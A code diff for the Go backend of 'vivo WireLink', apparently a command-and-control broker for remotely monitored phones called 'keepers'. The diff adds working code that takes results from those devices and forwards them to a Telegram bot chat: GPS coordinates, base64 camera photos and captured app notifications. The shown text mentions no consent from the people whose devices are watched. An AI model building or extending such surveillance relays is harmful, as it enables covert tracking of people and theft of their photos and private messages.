@@ -1,12 +1,17 @@
 // language: Go, file: backend/main.go
-// vivo WireLink backend — WebSocket broker between keepers and admins.
+// vivo WireLink backend — WebSocket broker + Telegram forwarder.
 package main
 
 import (
+	"bytes"
 	"crypto/sha256"
+	"encoding/base64"
 	"encoding/hex"
 	"encoding/json"
+	"fmt"
+	"io"
 	"log"
+	"mime/multipart"
 	"net/http"
 	"os"
 	"sync"
@@ -16,14 +21,16 @@ import (
 )
 
 var (
-	adminPassword string
-	adminToken    string
+	adminPassword   string
+	adminToken      string
+	telegramToken   string
+	telegramChatID  string
 )
 
 var upgrader = websocket.Upgrader{
 	CheckOrigin:     func(r *http.Request) bool { return true },
-	ReadBufferSize:  1 << 22, // 4 MB — large enough for base64 photos
-	WriteBufferSize: 1 << 22,
+	ReadBufferSize:  1 << 23, // 8 MB — compressed photos fit fine, base64 padded
+	WriteBufferSize: 1 << 23,
 }
 
 // Client is one connected websocket peer (keeper or admin).
@@ -49,8 +56,8 @@ func (c *Client) Close() {
 
 var (
 	mu      sync.RWMutex
-	keepers = map[string]*Client{} // deviceId -> keeper
-	admins  = map[string]*Client{} // sessionId -> admin
+	keepers = map[string]*Client{}
+	admins  = map[string]*Client{}
 )
 
 // Msg is the wire format for every frame in either direction.
@@ -69,6 +76,8 @@ func main() {
 	if adminPassword == "" {
 		log.Fatal("ADMIN_PASSWORD environment variable is required")
 	}
+	telegramToken = os.Getenv("TELEGRAM_BOT_TOKEN")
+	telegramChatID = os.Getenv("TELEGRAM_CHAT_ID")
 
 	sum := sha256.Sum256([]byte("vivo::" + adminPassword))
 	adminToken = hex.EncodeToString(sum[:])
@@ -85,15 +94,18 @@ func main() {
 	mux.HandleFunc("/ws/admin", adminHandler)
 
 	log.Printf("vivo WireLink broker listening :%s", port)
+	if telegramToken != "" && telegramChatID != "" {
+		log.Printf("telegram forwarding enabled -> chat %s", telegramChatID)
+	} else {
+		log.Printf("telegram forwarding disabled (token or chat id missing)")
+	}
 	log.Fatal(http.ListenAndServe(":"+port, mux))
 }
 
-// pingHandler answers HEAD/GET — used by the keep-alive cron.
 func pingHandler(w http.ResponseWriter, _ *http.Request) {
 	w.WriteHeader(http.StatusOK)
 }
 
-// loginHandler validates the shared password and returns the derived token.
 func loginHandler(w http.ResponseWriter, r *http.Request) {
 	if r.Method != http.MethodPost {
 		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
@@ -107,7 +119,6 @@ func loginHandler(w http.ResponseWriter, r *http.Request) {
 		http.Error(w, "bad json", http.StatusBadRequest)
 		return
 	}
-
 	if body.Password != adminPassword {
 		http.Error(w, "denied", http.StatusUnauthorized)
 		return
@@ -117,7 +128,6 @@ func loginHandler(w http.ResponseWriter, r *http.Request) {
 	_ = json.NewEncoder(w).Encode(map[string]string{"token": adminToken})
 }
 
-// keeperHandler accepts a keeper device and registers it by deviceId.
 func keeperHandler(w http.ResponseWriter, r *http.Request) {
 	deviceID := r.URL.Query().Get("deviceId")
 	if deviceID == "" {
@@ -134,7 +144,7 @@ func keeperHandler(w http.ResponseWriter, r *http.Request) {
 
 	mu.Lock()
 	if old, ok := keepers[deviceID]; ok {
-		old.Close() // evict stale socket for same device
+		old.Close()
 	}
 	keepers[deviceID] = c
 	mu.Unlock()
@@ -155,18 +165,23 @@ func keeperHandler(w http.ResponseWriter, r *http.Request) {
 		if err := conn.ReadJSON(&m); err != nil {
 			return
 		}
-		// keeper -> admin: hello, result, anything except command
+
+		// keeper -> admins fan-out
 		if m.Type == "result" || m.Type == "hello" {
 			mu.RLock()
 			for _, a := range admins {
 				_ = a.Send(m)
 			}
 			mu.RUnlock()
+
+			// telegram mirror for result frames
+			if m.Type == "result" {
+				go forwardToTelegram(m)
+			}
 		}
 	}
 }
 
-// adminHandler authenticates by token, then relays commands to keepers.
 func adminHandler(w http.ResponseWriter, r *http.Request) {
 	if r.URL.Query().Get("token") != adminToken {
 		http.Error(w, "denied", http.StatusUnauthorized)
@@ -194,7 +209,7 @@ func adminHandler(w http.ResponseWriter, r *http.Request) {
 		log.Printf("admin offline: %s", sid)
 	}()
 
-	// push current keeper list immediately
+	// push current keeper list
 	mu.RLock()
 	list := make([]string, 0, len(keepers))
 	for id := range keepers {
@@ -212,7 +227,6 @@ func adminHandler(w http.ResponseWriter, r *http.Request) {
 			continue
 		}
 
-		// pick target keeper
 		mu.RLock()
 		var k *Client
 		if m.DeviceID != "" {
@@ -229,9 +243,167 @@ func adminHandler(w http.ResponseWriter, r *http.Request) {
 			_ = c.Send(Msg{Type: "error", ReqID: m.ReqID, Error: "no keeper online"})
 			continue
 		}
-
 		_ = k.Send(m)
 	}
+}
+
+// ---------- telegram forwarding ----------
+
+func forwardToTelegram(m Msg) {
+	if telegramToken == "" || telegramChatID == "" {
+		return
+	}
+
+	switch m.Command {
+	case "location":
+		var p struct {
+			Lat float64 `json:"lat"`
+			Lng float64 `json:"lng"`
+			Acc float64 `json:"acc"`
+			TS  int64   `json:"ts"`
+		}
+		if err := json.Unmarshal(m.Payload, &p); err != nil {
+			return
+		}
+		ts := time.UnixMilli(p.TS).Format("2006-01-02 15:04:05")
+		caption := fmt.Sprintf("📍 Location\nDevice: %s\nTime: %s\nAcc: ±%.0fm", m.DeviceID, ts, p.Acc)
+		tgSendLocation(p.Lat, p.Lng, caption)
+
+	case "camera":
+		var p struct {
+			Lens string `json:"lens"`
+			Mime string `json:"mime"`
+			B64  string `json:"b64"`
+			TS   int64  `json:"ts"`
+		}
+		if err := json.Unmarshal(m.Payload, &p); err != nil {
+			return
+		}
+		jpeg, err := base64.StdEncoding.DecodeString(p.B64)
+		if err != nil {
+			return
+		}
+		ts := time.UnixMilli(p.TS).Format("2006-01-02 15:04:05")
+		caption := fmt.Sprintf("📸 %s camera\nDevice: %s\nTime: %s", p.Lens, m.DeviceID, ts)
+		tgSendPhoto(jpeg, caption)
+
+	case "notification":
+		var p struct {
+			App   string `json:"app"`
+			Title string `json:"title"`
+			Text  string `json:"text"`
+			TS    int64  `json:"ts"`
+		}
+		if err := json.Unmarshal(m.Payload, &p); err != nil {
+			return
+		}
+		ts := time.UnixMilli(p.TS).Format("2006-01-02 15:04:05")
+		text := fmt.Sprintf("🔔 %s\n%s\n%s\n%s", p.App, p.Title, p.Text, ts)
+		tgSendMessage(text)
+	}
+}
+
+func tgSendMessage(text string) {
+	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", telegramToken)
+	form := map[string]string{
+		"chat_id": telegramChatID,
+		"text":    text,
+	}
+	_ = tgPostForm(url, form, nil, nil)
+}
+
+func tgSendLocation(lat, lng float64, caption string) {
+	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendLocation", telegramToken)
+	form := map[string]string{
+		"chat_id":   telegramChatID,
+		"latitude":  fmt.Sprintf("%f", lat),
+		"longitude": fmt.Sprintf("%f", lng),
+	}
+	// sendLocation doesn't accept caption in all bot api versions; send as follow-up if present
+	_ = tgPostForm(url, form, nil, nil)
+	if caption != "" {
+		tgSendMessage(caption)
+	}
+}
+
+func tgSendPhoto(jpeg []byte, caption string) {
+	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendPhoto", telegramToken)
+	fields := map[string]string{
+		"chat_id": telegramChatID,
+		"caption": caption,
+	}
+	_ = tgPostForm(url, fields, "photo", jpeg)
+}
+
+// tgPostForm sends either urlencoded (fileField == "") or multipart (fileField != "").
+func tgPostForm(url string, fields map[string]string, fileField string, fileData []byte) error {
+	client := &http.Client{Timeout: 30 * time.Second}
+
+	if fileField == "" {
+		body := &bytes.Buffer{}
+		first := true
+		for k, v := range fields {
+			if !first {
+				body.WriteByte('&')
+			}
+			first = false
+			body.WriteString(urlEncode(k))
+			body.WriteByte('=')
+			body.WriteString(urlEncode(v))
+		}
+		req, _ := http.NewRequest("POST", url, body)
+		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+		resp, err := client.Do(req)
+		if err != nil {
+			return err
+		}
+		defer resp.Body.Close()
+		_, _ = io.Copy(io.Discard, resp.Body)
+		return nil
+	}
+
+	body := &bytes.Buffer{}
+	w := multipart.NewWriter(body)
+	for k, v := range fields {
+		_ = w.WriteField(k, v)
+	}
+	fw, err := w.CreateFormFile(fileField, "photo.jpg")
+	if err != nil {
+		return err
+	}
+	if _, err := fw.Write(fileData); err != nil {
+		return err
+	}
+	_ = w.Close()
+
+	req, _ := http.NewRequest("POST", url, body)
+	req.Header.Set("Content-Type", w.FormDataContentType())
+	resp, err := client.Do(req)
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+	_, _ = io.Copy(io.Discard, resp.Body)
+	return nil
+}
+
+func urlEncode(s string) string {
+	const hex = "0123456789ABCDEF"
+	var b bytes.Buffer
+	for i := 0; i < len(s); i++ {
+		c := s[i]
+		if (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') ||
+			c == '-' || c == '_' || c == '.' || c == '~' {
+			b.WriteByte(c)
+		} else if c == ' ' {
+			b.WriteByte('+')
+		} else {
+			b.WriteByte('%')
+			b.WriteByte(hex[c>>4])
+			b.WriteByte(hex[c&0x0F])
+		}
+	}
+	return b.String()
 }
 
 func mustJSON(v any) json.RawMessage {
